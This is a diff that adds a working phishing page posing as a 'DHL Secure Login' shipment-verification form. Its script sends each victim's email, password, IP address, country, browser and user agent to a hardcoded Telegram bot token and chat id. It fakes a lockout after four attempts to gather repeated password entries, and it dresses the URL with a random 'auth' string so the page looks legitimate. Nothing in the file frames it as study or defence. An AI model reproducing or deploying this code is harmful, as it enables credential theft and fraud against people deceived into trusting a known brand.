@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DHL Secure Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      position: relative;
+    }
+    video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+    .login-box {
+      background: rgba(255, 255, 255, 0.85);
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      z-index: 2;
+    }
+    .login-box img {
+      max-width: 160px;
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .login-box button {
+      width: 100%;
+      background-color: #ba0c2f;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #ccc;
+      cursor: allowed;
+    }
+    .login-box button:hover:not(:able) {
+      background-color: #9a0b27;
+    }
+    .disclaimer {
+      font-size: 11px;
+      color: #888;
+      margin-top: 15px;
+    }
+    #lockMsg {
+      margin-top: 10px;
+      font-size: 14px;
+      color: red;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video autoplay loop muted>
+    <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+  <div class="login-box">
+    <img src="https://storage.googleapis.com/dhl-rd111.appspot.com/images/logo.jpg" alt="DHL Logo" />
+    <p>To track shipment, please confirm that you own the recipient email.</p>
+    <p><strong>Verification Required</strong><br><small>SHIPMENT #CS-RBWS/2022BMA/6QC</small></p>
+    <form id="loginForm">
+      <input type="email" id="email" name="email" placeholder="Email Address" required />
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <button type="submit" id="submitBtn">Track Shipment >>></button>
+      <div class="lock-message" id="lockMsg"></div>
+    </form>
+    <div class="disclaimer">DHL Express ©2025 | All rights reserved</div>
+  </div>
+  <script>
+    const token = '8100003577:AAHC2fQp3kzGQRFxE5NmDkA8X5zIIXBwpiU';
+    const chatId = '6593538204';
+    let attempts = 0;
+    let locked = false;
+    const form = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const lockMessage = document.getElementById('lockMsg');
+    const params = new URLSearchParams(window.location.search);
+    const emailFromURL = params.get('email');
+    if (emailFromURL) emailInput.value = emailFromURL;
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      if (locked) return;
+      const email = emailInput.value;
+      const password = passwordInput.value;
+      const userAgent = navigator.userAgent;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      let browser = "Unknown";
+      if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
+      else if (userAgent.includes("SamsungBrowser")) browser = "Samsung Internet";
+      else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
+      else if (userAgent.includes("Trident")) browser = "Internet Explorer";
+      else if (userAgent.includes("Edge")) browser = "Microsoft Edge";
+      else if (userAgent.includes("Chrome")) browser = "Chrome";
+      else if (userAgent.includes("Safari")) browser = "Safari";
+      let ip = "Unavailable";
+      let country = "Unavailable";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const countryRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
+        const countryData = await countryRes.json();
+        country = countryData.country;
+      } catch (error) {
+        console.error("Error getting IP/country:", error);
+      }
+      const message = `📦 <b>DHL Secure Login</b>
+👤 Email: <code>${email}</code>
+🔒 Password: <code>${password}</code>
+🌐 IP: <code>${ip}</code>
+📍 Country: <code>${country}</code>
+🕹 Browser: <code>${browser}</code>
+🕓 Timezone: <code>${timezone}</code>
+📱 User-Agent: ${userAgent}`;
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+      attempts++;
+      if (attempts >= 4) lockForm();
+    });
+
+    function lockForm() {
+      locked = true;
+      form.querySelector('button').disabled = true;
+      let timeLeft = 30;
+      lockMessage.style.display = 'block';
+      const interval = setInterval(() => {
+        lockMessage.textContent = `Too many attempts. Try again in ${timeLeft} seconds.`;
+        timeLeft--;
+        if (timeLeft < 0) {
+          clearInterval(interval);
+          attempts = 0;
+          locked = false;
+          lockMessage.style.display = 'none';
+          form.querySelector('button').disabled = false;
+        }
+      }, 1000);
+    }
+  </script>
+
+  <script>
+        function generateRandomString(length) {
+            const characters = 'Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+        function appendRandomStringToURL() {
+            const randomString = generateRandomString(350);
+            const currentURL = window.location.href.split('?')[0];
+            // Use string concatenation as a temporary measure to avoid potential backtick issues
+            window.history.replaceState(null, null, currentURL + "?auth=" + randomString);
+        }
+        window.onload = appendRandomStringToURL;
+    </script>
+
+
+
+</body>
+</html>
